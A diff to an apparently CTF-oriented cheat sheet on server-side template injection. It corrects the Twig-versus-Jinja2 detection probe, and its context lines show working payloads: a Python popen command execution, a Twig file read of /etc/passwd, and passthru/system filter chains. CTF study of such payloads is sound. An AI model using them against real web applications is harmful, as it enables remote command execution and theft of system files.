@@ -237,7 +237,7 @@ ${__import__('os').popen('cat /flag.txt').read()}
 ```twig
 {# Detection #}
 {{7*7}}   {# Returns 49 #}
-{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}
+{{7*'7'}} {# Returns 49 (numeric cast = Twig; Jinja2 would string-repeat to 7777777) #}
 
 {# File read #}
 {{'/etc/passwd'|file_excerpt(1,30)}}
@@ -250,7 +250,7 @@ ${__import__('os').popen('cat /flag.txt').read()}
 {{['cat /flag.txt']|map('passthru')|join}}
 ```
 
-**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.
+**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Jinja2 repeats the string (`7777777`), Twig numeric-casts to `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.
 
 ### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)
 
